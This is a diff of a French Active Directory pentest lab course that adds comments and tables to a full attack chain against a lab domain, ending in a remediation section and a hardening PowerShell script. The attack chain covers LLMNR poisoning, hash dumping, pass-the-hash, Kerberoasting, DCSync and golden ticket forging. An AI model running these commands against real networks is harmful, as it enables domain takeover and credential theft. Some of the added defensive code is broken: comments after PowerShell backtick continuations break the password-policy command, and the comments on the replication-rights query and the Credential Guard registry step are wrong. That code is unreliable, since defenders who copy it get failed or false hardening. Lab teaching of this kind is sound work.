     -nthash "$KRBTGT_HASH" \
     -domain-sid "$DOMAIN_SID" \
     -domain corp.shadow.local \
     -groups 512,519,518 \
     Administrator
+```
 
-# Output attendu :
-# Impacket v0.12.0 - Copyright 2022 Fortra
-# [*] Creating golden ticket for Administrator@corp.shadow.local
-# [*] Ticket saved to Administrator.ccache
+```text
+Output attendu :
+[*] Creating golden ticket for Administrator@corp.shadow.local
+[*] Ticket saved to Administrator.ccache
+```
 
-# Étape 4 : Exporter et utiliser le ticket
+```bash
+# Étape 4 : Exporter le ticket forgé dans la session courante
+# KRB5CCNAME est la variable d'environnement que Kerberos utilise
+# pour trouver le fichier de cache contenant les tickets
 export KRB5CCNAME=/tmp/administrator.ccache
 
-# Vérifier le ticket
+# Vérifier le ticket avec klist
+# klist affiche les tickets Kerberos dans le cache actuel
+# On voit que le ticket est valide pour 10 ans (persistance totale)
 klist
-# Ticket cache: FILE:/tmp/administrator.ccache
-# Default principal: Administrator@corp.shadow.local
-# Valid starting: 2025-05-30 10:00:00
-# Expires: 2035-05-28 10:00:00
+```
 
-# Étape 5 : Accès persistant au DC
+```text
+Ticket cache: FILE:/tmp/administrator.ccache
+Default principal: Administrator@corp.shadow.local
+Valid starting: 2025-05-30 10:00:00
+Expires: 2035-05-28 10:00:00       ← Durée de validité de 10 ans !
+```
+
+```bash
+# Étape 5 : Accès persistant au contrôleur de domaine
+# impacket-smbexec avec -k et -no-pass utilise le ticket forgé
+# pour s'authentifier via Kerberos (sans mot de passe ni hash)
+# On obtient un shell avec les droits d'administrateur du domaine sur DC01
 impacket-smbexec \
     -k \
     -no-pass \
     CORPSHADOW/Administrator@DC01.corp.shadow.local
-
-# Shell sur DC01 :
-# C:\> whoami
-# corp-shadow\administrator
-# C:\> type C:\Flags\flag6.txt
-# FLAG{Module10_dcsync_u1v2w3x4}
 ```
+
+**Explication des commandes de l'exécution complète :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `impacket-lookupsid ... \| grep "Domain SID"` | Récupère le SID du domaine via SAMR ; `grep` filtre la sortie pour isoler le SID nécessaire au Golden Ticket |
+| `impacket-secretsdump ... -just-dc` | DCSync : extrait tous les hash NTLM du domaine via DRSUAPI, y compris celui du KRBTGT |
+| `KRBTGT_HASH="<...>"` | Variable shell stockant le hash KRBTGT (pour lisibilité et réutilisation) |
+| `DOMAIN_SID="S-1-5-21-..."` | Variable shell stockant le SID du domaine |
+| `impacket-ticketer -nthash "$KRBTGT_HASH" -domain-sid "$DOMAIN_SID" ...` | Forge un TGT pour Administrator avec les groupes Domain Admins (512), Schema Admins (518), Enterprise Admins (519) |
+| `export KRB5CCNAME=/tmp/administrator.ccache` | Définit la variable d'environnement pointant vers le cache Kerberos contenant le Golden Ticket |
+| `klist` | Affiche les tickets Kerberos dans le cache (vérification) |
+| `impacket-smbexec -k -no-pass Administrator@DC01.corp.shadow.local` | Obtient un shell sur DC01 en utilisant le Golden Ticket (authentification Kerberos sans mot de passe) |
 
 #### 5.6.6 Flag attendu
 
@@ -1102,48 +1502,58 @@ FLAG{Module10_dcsync_u1v2w3x4}
 #### 5.6.7 Analyse post-exercice — Remédiation
 
 ```powershell
-# 1. Surveiller les événements DRS (réplication)
-# Événement 4662 : opération sur un objet Active Directory
-# Rechercher l'opération "GetNCChanges" (DS-Replication-Get-Changes)
-# 
-# Événement 5141 : réplication d'annuaire
-
-# Activer l'audit avancé pour les services d'annuaire
+# 1. Activer l'audit avancé pour les services d'annuaire AD
+# L'événement 4662 est généré lors d'une opération sur un objet AD
+# L'opération "GetNCChanges" (GUID 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
+# correspond à une requête de réplication DCSync
+# auditpol configure les politiques d'audit de sécurité Windows
+# /subcategory:"Directory Service Access" : audite l'accès aux objets AD
+# /success:enable : journalise les accès réussis
 auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
+
+# Auditer les modifications des services d'annuaire
+# Détecte les changements dans les objets AD (création, modification, suppression)
 auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable
 
-# 2. Restreindre les droits de réplication
-# Vérifier les comptes avec droits de réplication :
+# 2. Restreindre les droits de réplication aux seuls comptes autorisés
+# Get-ADObject interroge AD pour trouver les comptes ayant des droits de réplication
+# -SearchBase : base de recherche dans la configuration AD
+# -Filter : filtre les objets de type "user"
+# Where-Object : filtre les comptes avec l'attribut msDS-NeverRevealGroup
 Get-ADObject `
     -SearchBase "CN=Configuration,DC=corp,DC=shadow,DC=local" `
     -Filter {ObjectClass -eq "user"} `
     -Properties * | `
     Where-Object { $_.'msDS-NeverRevealGroup' -ne $null }
 
-# Utiliser les groupes RODC (Read-Only Domain Controller) protégés
-# pour restreindre les comptes pouvant répliquer
-
-# 3. Protéger le compte KRBTGT
-# Changer le mot de passe KRBTGT régulièrement (2x de suite, à 24h d'intervalle)
-# ATTENTION : changer KRBTGT invalide tous les TGT existants
-
-# Premier changement :
+# 3. Protéger le compte KRBTGT (la clé maîtresse du domaine Kerberos)
+# Reset-ADAccountPassword réinitialise le mot de passe du compte KRBTGT
+# -Identity : nom du compte (krbtgt)
+# -Reset : force la réinitialisation (même si l'utilisateur ne connaît pas l'ancien)
+# -NewPassword : nouveau mot de passe (converti en SecureString)
+# ATTENTION : changer KRBTGT invalide TOUS les TGT existants dans le domaine
+# Il faut le changer DEUX FOIS à 24h d'intervalle pour être certain
+# que tous les TGT forgés (Golden Ticket) soient invalidés
 Reset-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString "NewP@ss123!" -AsPlainText -Force)
 
-# 4. Utiliser des comptes de service protégés (Group Managed Service Accounts)
-# 5. Déployer Microsoft Defender for Identity (Azure ATP)
-#    Il détecte les tentatives DCSync anormales
-
-# 6. Activer le mode protection supplémentaire pour l'authentification
-# (Extended Protection for Authentication)
+# 4. Activer le mode de protection étendue pour l'authentification (EPA)
+# Extended Protection for Authentication empêche les attaques de relay
+# SuppressExtendedProtection = 0 active la protection (ne la supprime pas)
 Set-ItemProperty `
     -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" `
     -Name "SuppressExtendedProtection" `
     -Value 0
-
-# 7. Configurer le pare-feu pour limiter la réplication aux DCs autorisés
-# (Règle de trafic entrant RPC dynamique)
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable` | Active l'audit des accès aux objets AD (événement 4662) pour détecter les opérations de réplication anormales |
+| `auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable` | Active l'audit des modifications des services d'annuaire (détection de DCSync) |
+| `Get-ADObject -SearchBase "CN=Configuration,..." -Filter {ObjectClass -eq "user"}` | Recherche les comptes utilisateur dans la configuration AD ayant des droits de réplication |
+| `Reset-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString ...)` | Réinitialise le mot de passe du KRBTGT (invalide les TGT existants, dont les Golden Tickets) |
+| `Set-ItemProperty ... SuppressExtendedProtection -Value 0` | Active la protection étendue pour l'authentification (EPA) contre les attaques de relay |
 
 ---
 
@@ -1238,15 +1648,34 @@ Persistance totale                   ──┘
 **Commande à vérifier :**
 
 ```bash
-# Vérifier que le port LDAP est ouvert
+# Vérifier que le port LDAP (389/TCP) est ouvert sur le contrôleur de domaine
+# nmap -p 389 scanne uniquement le port spécifié (rapide)
+# Si le port est filtré/fermé, BloodHound ne pourra pas collecter les données
 nmap -p 389 10.10.10.10
 
-# Lister les utilisateurs avec ldapsearch (alternative manuelle)
+# Lister les utilisateurs avec ldapsearch (alternative manuelle à BloodHound)
+# -x : authentification simple (anonyme)
+# -H : URI LDAP (ldap://IP)
+# -b : base de recherche (DN du domaine)
+# -s sub : scope = subtree (recherche récursive)
+# (objectClass=user) : filtre pour les objets utilisateur
+# sAMAccountName : attribut à retourner (nom du compte)
 ldapsearch -x -H ldap://10.10.10.10 -b "DC=corp,DC=shadow,DC=local" -s sub "(objectClass=user)" sAMAccountName
 
-# Pour BloodHound, utiliser l'option -u avec un compte vide
+# Pour BloodHound avec un compte vide (tentative anonyme)
+# -u '' : utilisateur vide (connexion anonyme)
+# -p '' : mot de passe vide
+# Certaines configurations AD autorisent encore l'accès LDAP anonyme
 bloodhound-python -d corp.shadow.local -ns 10.10.10.10 -c all -u '' -p ''
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `nmap -p 389 10.10.10.10` | Scan le port LDAP (389) sur le DC ; `-p` = port spécifique |
+| `ldapsearch -x -H ldap://... -b "DC=..." -s sub "(objectClass=user)" sAMAccountName` | Requête LDAP manuelle : `-x` = authentification simple, `-H` = serveur LDAP, `-b` = base de recherche, `-s sub` = recherche récursive, filtre = objets utilisateur, attribut = sAMAccountName |
+| `bloodhound-python -u '' -p ''` | Lance BloodHound en mode anonyme (tentative sur configurations non durcies) |
 
 </details>
 
@@ -1260,15 +1689,33 @@ bloodhound-python -d corp.shadow.local -ns 10.10.10.10 -c all -u '' -p ''
 **Astuce technique :** Vérifiez que votre interface est en mode promiscuous :
 
 ```bash
-# Mettre l'interface en mode promiscuous
+# Mettre l'interface réseau en mode promiscuous
+# Le mode promiscuous permet à la carte réseau de capturer TOUS les paquets
+# du segment réseau, pas seulement ceux destinés à notre adresse MAC
+# sudo est nécessaire pour la configuration réseau
 sudo ip link set eth0 promisc on
 
-# Vérifier le trafic LLMNR (port UDP 5355)
+# Vérifier le trafic LLMNR (port UDP 5355) en temps réel
+# tcpdump capture les paquets réseau et les affiche dans le terminal
+# -i eth0 : interface à écouter
+# udp port 5355 : filtre UDP sur le port LLMNR
+# -n : ne pas résoudre les adresses IP en noms (évite des requêtes DNS supplémentaires)
 sudo tcpdump -i eth0 udp port 5355 -n
 
-# Lancer Responder en mode silencieux d'abord pour observer
+# Lancer Responder en mode silencieux pour observer le trafic
+# -I eth0 : interface réseau
+# -v : mode verbeux (affiche chaque requête)
+# Observer d'abord permet de voir si LLMNR est actif sur le réseau
 sudo responder -I eth0 -v
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `sudo ip link set eth0 promisc on` | Active le mode promiscuous sur eth0 (capture de tout le trafic réseau, pas seulement celui destiné à notre MAC) |
+| `sudo tcpdump -i eth0 udp port 5355 -n` | Capture et affiche les paquets LLMNR (UDP 5355) ; `-n` = pas de résolution DNS pour les IP |
+| `sudo responder -I eth0 -v` | Lance Responder (empoisonneur LLMNR/NBT-NS) en mode verbeux pour observer les requêtes |
 
 Les logs sont stockés dans `/usr/share/responder/logs/`. Le hash commence par le format : `jdoe::CORPSHADOW:...`
 
@@ -1289,9 +1736,20 @@ Les logs sont stockés dans `/usr/share/responder/logs/`. Le hash commence par l
 **Solution possible :** Visez le serveur de fichiers FS01 (10.10.10.20). Les serveurs ont souvent une configuration moins restrictive.
 
 ```bash
-# Tester l'accès SMB
+# Tester l'accès SMB sur FS01
+# smbclient est un client SMB pour Linux (similaire à net use sur Windows)
+# -L : liste les partages disponibles sur le serveur
+# //10.10.10.20 : adresse du serveur SMB cible (FS01)
+# -U CORPSHADOW/jdoe : utilisateur du domaine pour l'authentification
+# Cette commande permet de vérifier que jdoe a bien accès aux partages SMB
 smbclient -L //10.10.10.20 -U CORPSHADOW/jdoe
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `smbclient -L //10.10.10.20 -U CORPSHADOW/jdoe` | Liste les partages SMB de FS01 ; `-L` = lister les partages, `//IP` = cible, `-U` = utilisateur pour l'authentification |
 
 </details>
 
@@ -1314,12 +1772,22 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>:::
 - Utilisez le format `aad3b435b51404eeaad3b435b51404ee:<NT_HASH>` pour le paramètre `-hashes`
 
 ```bash
-# Tester le hash de l'admin local
+# Tester le hash de l'administrateur local sur FS01
+# Utilise le hash NTLM extrait du SAM (RID 500 = Administrateur intégré)
+# Si le même mot de passe admin est utilisé sur WS01 et FS01, le hash sera identique
 impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> Administrateur@10.10.10.20
 
-# Si ça ne marche pas, essayez avec jdoe (peut-être admin local ?)
+# Si ça ne marche pas, essayez avec le compte jdoe (peut-être admin local sur la cible ?)
+# Utilise le hash NTLM de jdoe récupéré via secretsdump
 impacket-wmiexec -hashes :<JDOE_NT_HASH> CORPSHADOW/jdoe@10.10.10.20
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> Administrateur@10.10.10.20` | Teste le hash de l'admin local sur FS01 (nom français : `Administrateur`) |
+| `impacket-wmiexec -hashes :<JDOE_NT_HASH> CORPSHADOW/jdoe@10.10.10.20` | Teste le hash de jdoe (si jdoe est admin local sur FS01) |
 
 </details>
 
@@ -1333,15 +1801,36 @@ impacket-wmiexec -hashes :<JDOE_NT_HASH> CORPSHADOW/jdoe@10.10.10.20
 **Dépannage :**
 
 ```bash
-# Vérifier la résolution DNS
+# Vérifier la résolution DNS du domaine
+# nslookup interroge le serveur DNS (10.10.10.10 = DC01) pour résoudre le nom de domaine
+# Si la résolution DNS échoue, Kerberos ne fonctionnera pas correctement
 nslookup corp.shadow.local 10.10.10.10
 
 # Vérifier l'authentification Kerberos
+# kvno obtient le numéro de version d'une clé Kerberos
+# -k : utiliser le keytab (table de clés)
+# -t /dev/null : fichier keytab vide (test sans authentification préalable)
+# CORPSHADOW/jdoe@CORP.SHADOW.LOCAL : UPN (User Principal Name) du compte
+# Si la commande réussit, Kerberos fonctionne
 kvno -k -t /dev/null CORPSHADOW/jdoe@CORP.SHADOW.LOCAL
 
-# Tester la connexion LDAP
+# Tester la connexion LDAP avec authentification
+# -H : URI du serveur LDAP
+# -D : bind DN (distinguished name) pour l'authentification
+# -w : mot de passe en clair
+# -b : base de recherche
+# "(objectClass=user)" : filtre pour les objets utilisateur
+# servicePrincipalName : attribut SPN à retourner
 ldapsearch -H ldap://10.10.10.10 -D "CORPSHADOW\jdoe" -w 'P@ssw0rd!2025' -b "DC=corp,DC=shadow,DC=local" "(objectClass=user)" servicePrincipalName
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `nslookup corp.shadow.local 10.10.10.10` | Interroge le DNS (10.10.10.10) pour résoudre le nom de domaine `corp.shadow.local` |
+| `kvno -k -t /dev/null CORPSHADOW/jdoe@CORP.SHADOW.LOCAL` | Teste l'authentification Kerberos ; `-k` = utilise un keytab, `-t /dev/null` = keytab vide (test sans credentials) |
+| `ldapsearch -H ldap://10.10.10.10 -D "CORPSHADOW\jdoe" -w 'P@ssw0rd!2025' -b "DC=..." "(objectClass=user)" servicePrincipalName` | Requête LDAP authentifiée pour lister les SPN (Service Principal Names) des utilisateurs du domaine |
 
 **Pour le crack :** Le mot de passe du service est dans le dictionnaire `rockyou.txt`. Utilisez le mode hashcat 13100 pour Kerberos 5 TGS-REP.
 
@@ -1359,21 +1848,38 @@ ldapsearch -H ldap://10.10.10.10 -D "CORPSHADOW\jdoe" -w 'P@ssw0rd!2025' -b "DC=
 
 ```bash
 # Si DCSync échoue, vérifiez les droits de votre compte
-# Il faut que le compte soit membre de "Domain Admins"
+# DCSync nécessite les droits "Replicating Directory Changes" et
+# "Replicating Directory Changes All" sur le domaine
+# En général, seuls les membres de "Domain Admins" ont ces droits
 
-# Vérifier les groupes de l'utilisateur
+# Vérifier les groupes de l'utilisateur jdoe via SMB/RPC
+# net rpc group members : liste les membres d'un groupe
+# "Domain Admins" : nom du groupe à vérifier
+# -W : nom du domaine (Workgroup/domain)
+# -I : adresse IP du serveur
+# -U : utilisateur pour l'authentification
 net rpc group members "Domain Admins" -W corp.shadow.local -I 10.10.10.10 -U jdoe
 
-# Alternative : si vous avez le hash de l'admin, faites PtH vers le DC
-# puis DCSync depuis le DC lui-même
+# Alternative : si vous avez le hash NTLM de l'administrateur du domaine,
+# faites un Pass-the-Hash vers le DC, puis exécutez DCSync depuis le DC lui-même
 impacket-wmiexec -hashes :<ADMIN_HASH> CORPSHADOW/Administrator@10.10.10.10
 ```
 
 **Pour le Golden Ticket :** Le SID du domaine commence par `S-1-5-21-`. Utilisez `lookupsid` pour le trouver :
 
 ```bash
+# Récupérer le SID du domaine via l'outil lookupsid d'Impacket
+# lookupsid interroge le contrôleur de domaine via SAMR (Security Account Manager Remote)
+# pour lister tous les utilisateurs et groupes avec leurs SID respectifs
+# La première ligne de l'output contient le SID du domaine
 impacket-lookupsid CORPSHADOW/jdoe:'P@ssw0rd!2025'@10.10.10.10
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `impacket-lookupsid CORPSHADOW/jdoe:'P@ssw0rd!2025'@10.10.10.10` | Interroge le DC via SAMR pour lister les SID des utilisateurs et groupes ; la première ligne contient le SID du domaine |
 
 </details>
 
@@ -1383,16 +1889,31 @@ impacket-lookupsid CORPSHADOW/jdoe:'P@ssw0rd!2025'@10.10.10.10
 
 ### 8.1 Tableau récapitulatif
 
-| Flag | Technique ATT&CK | ID ATT&CK | Outil | Payload / Commande | Impact | Remédiation |
-|------|------------------|-----------|-------|--------------------|--------|-------------|
-| **F1** | Domain Account Discovery | T1087.002 | bloodhound-python | `bloodhound-python -d corp.shadow.local -ns 10.10.10.10 -c all` | Cartographie complète du domaine → identification des cibles | Restreindre l'accès LDAP anonyme |
-| **F2** | LLMNR/NBT-NS Poisoning | T1557.001 | Responder | `responder -I eth0 -rdwv` | Capture du hash NTLMv2 de l'utilisateur | Désactiver LLMNR via GPO |
-| **F2** | Password Cracking | T1110.002 | john / hashcat | `john --wordlist=rockyou.txt hash.txt` | Mot de passe utilisateur en clair | Politique de mot de passe fort + MFA |
-| **F3** | SAM Dumping | T1003.002 | impacket-secretsdump | `impacket-secretsdump CORPSHADOW/jdoe:P@ssw0rd!2025@10.10.10.20` | Hashes des comptes locaux et domaine | Credential Guard + LAPS |
-| **F4** | Pass-the-Hash | T1550.002 | impacket-wmiexec | `impacket-wmiexec -hashes :<NT_HASH> user@target` | Shell sur machine distante avec droits élevés | LAPS + Mots de passe uniques |
-| **F5** | Kerberoasting | T1558.003 | impacket-GetUserSPNs | `impacket-GetUserSPNs domain/user:pass -dc-ip DC -request` | Mot de passe du compte de service en clair | Comptes gMSA + AES256 |
-| **F6** | DCSync | T1003.006 | impacket-secretsdump | `impacket-secretsdump admin@DC -just-dc` | Tous les hashes du domaine (dont KRBTGT) | Surveiller événements 4662 + droits de réplication |
-| **F6** | Golden Ticket | T1558.001 | impacket-ticketer | `impacket-ticketer -nthash <KRBTGT> -domain-sid <SID> -domain corp.shadow.local Administrator` | Accès persistant à tout le domaine | Rotation KRBTGT + détection |
+**Identification et outils :**
+
+| Flag | Technique ATT&CK | ID ATT&CK | Outil |
+|------|------------------|-----------|-------|
+| **F1** | Domain Account Discovery | T1087.002 | bloodhound-python |
+| **F2** | LLMNR/NBT-NS Poisoning | T1557.001 | Responder |
+| **F2** | Password Cracking | T1110.002 | john / hashcat |
+| **F3** | SAM Dumping | T1003.002 | impacket-secretsdump |
+| **F4** | Pass-the-Hash | T1550.002 | impacket-wmiexec |
+| **F5** | Kerberoasting | T1558.003 | impacket-GetUserSPNs |
+| **F6** | DCSync | T1003.006 | impacket-secretsdump |
+| **F6** | Golden Ticket | T1558.001 | impacket-ticketer |
+
+**Commande, impact et remédiation :**
+
+| Flag | Payload / Commande | Impact | Remédiation |
+|------|--------------------|--------|-------------|
+| **F1** | `bloodhound-python -d corp.shadow.local -ns 10.10.10.10 -c all` | Cartographie complète du domaine → identification des cibles | Restreindre l'accès LDAP anonyme |
+| **F2** | `responder -I eth0 -rdwv` | Capture du hash NTLMv2 de l'utilisateur | Désactiver LLMNR via GPO |
+| **F2** | `john --wordlist=rockyou.txt hash.txt` | Mot de passe utilisateur en clair | Politique de mot de passe fort + MFA |
+| **F3** | `impacket-secretsdump CORPSHADOW/jdoe:P@ssw0rd!2025@10.10.10.20` | Hashes des comptes locaux et domaine | Credential Guard + LAPS |
+| **F4** | `impacket-wmiexec -hashes :<NT_HASH> user@target` | Shell sur machine distante avec droits élevés | LAPS + Mots de passe uniques |
+| **F5** | `impacket-GetUserSPNs domain/user:pass -dc-ip DC -request` | Mot de passe du compte de service en clair | Comptes gMSA + AES256 |
+| **F6** | `impacket-secretsdump admin@DC -just-dc` | Tous les hashes du domaine (dont KRBTGT) | Surveiller événements 4662 + droits de réplication |
+| **F6** | `impacket-ticketer -nthash <KRBTGT> -domain-sid <SID> -domain corp.shadow.local Administrator` | Accès persistant à tout le domaine | Rotation KRBTGT + détection |
 
 ### 8.2 Fiche de documentation détaillée (à remplir par l'étudiant)
 
@@ -1516,42 +2037,53 @@ _______________________________________________
     Date : 2025-05-30
 #>
 
-# Vérifier que le script est exécuté avec les droits admin
+# Vérifier que le script est exécuté avec les droits administrateur
+# [Security.Principal.WindowsPrincipal] interroge le jeton d'accès du processus
+# pour vérifier si l'utilisateur appartient au groupe Administrateurs intégré
 $isAdmin = [Security.Principal.WindowsPrincipal]::new(
     [Security.Principal.WindowsIdentity]::GetCurrent()
 ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 if (-not $isAdmin) {
     Write-Error "Ce script doit être exécuté en tant qu'Administrateur"
-    exit 1
+    exit 1  # Quitte le script avec code d'erreur 1
 }
 
 Write-Host "=== Début du durcissement AD CorpShadow ===" -ForegroundColor Cyan
 
 # ============================================
-# 1. Désactiver LLMNR
+# 1. Désactiver LLMNR (Link-Local Multicast Name Resolution)
+#    Empêche l'empoisonnement de la résolution de noms locale
 # ============================================
 Write-Host "[1/8] Désactivation de LLMNR..." -ForegroundColor Yellow
 try {
+    # Chemin registre de la politique DNS sous Local Machine
     $llmnrPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient"
+    # Test-Path vérifie si la clé existe ; si non, New-Item la crée
     if (-not (Test-Path $llmnrPath)) {
-        New-Item -Path $llmnrPath -Force | Out-Null
+        New-Item -Path $llmnrPath -Force | Out-Null  # Out-Null supprime la sortie
     }
+    # EnableMulticast = 0 désactive LLMNR (valeur par défaut : 1 = activé)
     Set-ItemProperty -Path $llmnrPath -Name "EnableMulticast" -Value 0
     Write-Host "  ✓ LLMNR désactivé" -ForegroundColor Green
 } catch {
+    # $_ contient le message d'erreur de la dernière exception
     Write-Error "  ✗ Échec : $_"
 }
 
 # ============================================
-# 2. Désactiver NBT-NS (via la carte réseau)
+# 2. Désactiver NBT-NS (NetBIOS Name Service)
+#    via les paramètres TCP/IP de chaque carte réseau
 # ============================================
 Write-Host "[2/8] Désactivation de NBT-NS..." -ForegroundColor Yellow
 try {
+    # Get-WmiObject interroge WMI pour lister les configurations réseau
+    # Where-Object filtre : ne garder que les cartes avec IP activée
     $adapters = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }
     foreach ($adapter in $adapters) {
-        $result = $adapter.SetTcpipNetbios(2)  # 2 = Disable NetBIOS over TCP/IP
-        if ($result.ReturnValue -eq 0) {
+        # SetTcpipNetbios(2) : 0 = utiliser paramètre DHCP, 1 = activer, 2 = désactiver
+        $result = $adapter.SetTcpipNetbios(2)
+        if ($result.ReturnValue -eq 0) {  # 0 = succès
             Write-Host "  ✓ NBT-NS désactivé sur $($adapter.Description)" -ForegroundColor Green
         } else {
             Write-Warning "  ⚠ Échec sur $($adapter.Description) (code: $($result.ReturnValue))"
@@ -1562,14 +2094,18 @@ try {
 }
 
 # ============================================
-# 3. Activer SMB Signing (protection anti-relay)
+# 3. Activer SMB Signing (protection contre le relay SMB)
+#    Empêche les attaques de type SMB Relay / NTLM Relay
 # ============================================
 Write-Host "[3/8] Activation de SMB Signing..." -ForegroundColor Yellow
 try {
+    # Côté serveur (LanmanServer) : Require = exigé, Enable = activé
     Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" `
         -Name "RequireSecuritySignature" -Value 1
+    # Côté client (LanmanWorkstation) : exiger la signature des réponses
     Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" `
         -Name "RequireSecuritySignature" -Value 1
+    # EnableSecuritySignature : activer la signature même si non requise
     Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" `
         -Name "EnableSecuritySignature" -Value 1
     Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" `
@@ -1580,18 +2116,21 @@ try {
 }
 
 # ============================================
-# 4. Activer Credential Guard (protège LSASS)
+# 4. Activer Windows Defender Credential Guard
+#    Isole LSASS dans un conteneur virtualisé (protection matérielle)
 # ============================================
 Write-Host "[4/8] Activation de Windows Defender Credential Guard..." -ForegroundColor Yellow
 try {
-    # Vérifier que le système supporte Credential Guard
+    # Vérifier la version du système d'exploitation (>= Windows Server 2016)
     $osInfo = Get-WmiObject Win32_OperatingSystem
-    if ($osInfo.Version -ge "10.0.14393") {
-        # Ajouter la clé de registre pour Credential Guard
+    if ($osInfo.Version -ge "10.0.14393") {  # 10.0.14393 = Windows Server 2016 RTM
+        # Créer la clé LsaCfgFlags si elle n'existe pas
         $credGuardPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
         if (-not (Test-Path "$credGuardPath\LsaCfgFlags")) {
             New-Item -Path $credGuardPath -Name "LsaCfgFlags" -Force | Out-Null
         }
+        # Valeur 1 = Credential Guard avec UEFI lock (recommandé)
+        # Valeur 2 = sans UEFI lock (peut être désactivé via GPO)
         Set-ItemProperty -Path $credGuardPath -Name "LsaCfgFlags" -Value 1
         Write-Host "  ✓ Credential Guard activé (redémarrage nécessaire)" -ForegroundColor Green
     } else {
@@ -1602,12 +2141,15 @@ try {
 }
 
 # ============================================
-# 5. Désactiver WDigest (empêche stockage en clair)
+# 5. Désactiver WDigest (empêche le stockage du mot de passe en clair)
+#    WDigest stockait le mot de passe en clair en mémoire pour l'héritage
 # ============================================
 Write-Host "[5/8] Désactivation de WDigest..." -ForegroundColor Yellow
 try {
+    # UseLogonCredential = 0 désactive le stockage du mot de passe en clair
     Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
         -Name "UseLogonCredential" -Value 0
+    # Negotiate = 0 désactive la négociation WDigest
     Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
         -Name "Negotiate" -Value 0
     Write-Host "  ✓ WDigest désactivé" -ForegroundColor Green
@@ -1617,9 +2159,12 @@ try {
 
 # ============================================
 # 6. Restreindre l'accès au registre distant
+#    Empêche secretsdump d'accéder aux ruches SAM/SYSTEM à distance
 # ============================================
 Write-Host "[6/8] Restriction de l'accès au registre distant..." -ForegroundColor Yellow
 try {
+    # RemoteRegAccess = 1 limite l'accès aux administrateurs authentifiés
+    # Valeur 0 = accès ouvert à tout utilisateur authentifié
     Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg" `
         -Name "RemoteRegAccess" -Value 1
     Write-Host "  ✓ Accès au registre distant restreint" -ForegroundColor Green
@@ -1629,16 +2174,21 @@ try {
 
 # ============================================
 # 7. Activer les types de chiffrement AES256 pour les comptes de service
+#    Remplace RC4 (vulnérable au Kerberoasting) par AES128 + AES256
 # ============================================
 Write-Host "[7/8] Configuration des types de chiffrement AES256..." -ForegroundColor Yellow
 try {
+    # Liste des comptes de service à migrer vers AES
     $serviceAccounts = @("svc_backup", "svc_sql")
     foreach ($sam in $serviceAccounts) {
         try {
+            # Get-ADUser récupère l'utilisateur AD et ses types de chiffrement
             $user = Get-ADUser -Identity $sam -Properties msDS-SupportedEncryptionTypes
             if ($user) {
+                # msDS-SupportedEncryptionTypes = 24 signifie AES128 (8) + AES256 (16)
+                # Cela désactive RC4 (4) qui est requis par le Kerberoasting
                 Set-ADUser -Identity $sam -Replace @{
-                    "msDS-SupportedEncryptionTypes" = 24  # AES128 + AES256
+                    "msDS-SupportedEncryptionTypes" = 24
                 } -ErrorAction Stop
                 Write-Host "  ✓ AES activé pour $sam" -ForegroundColor Green
             }
@@ -1652,25 +2202,27 @@ try {
 
 # ============================================
 # 8. Appliquer la politique de mot de passe renforcée
+#    Conforme aux recommandations ANSSI et NIS2
 # ============================================
 Write-Host "[8/8] Application de la politique de mot de passe..." -ForegroundColor Yellow
 try {
-    # Cette partie nécessite les outils RSAT AD
+    # Import-Module ActiveDirectory charge le module AD (nécessite RSAT)
+    # -ErrorAction SilentlyContinue ignore l'erreur si le module n'existe pas
     Import-Module ActiveDirectory -ErrorAction SilentlyContinue
 
     if (Get-Module -Name ActiveDirectory) {
-        # Politique de domaine par défaut
+        # Set-ADDefaultDomainPasswordPolicy configure la politique de mot de passe du domaine
         Set-ADDefaultDomainPasswordPolicy `
-            -Identity corp.shadow.local `
-            -MinPasswordLength 14 `
-            -MaxPasswordAge 90 `
-            -MinPasswordAge 1 `
-            -PasswordHistoryCount 24 `
-            -ReversibleEncryptionEnabled $false `
-            -ComplexityEnabled $true `
-            -LockoutThreshold 5 `
-            -LockoutDuration 30 `
-            -LockoutObservationWindow 30
+            -Identity corp.shadow.local `       # Domaine cible
+            -MinPasswordLength 14 `              # Longueur minimale : 14 caractères
+            -MaxPasswordAge 90 `                 # Expiration : 90 jours max
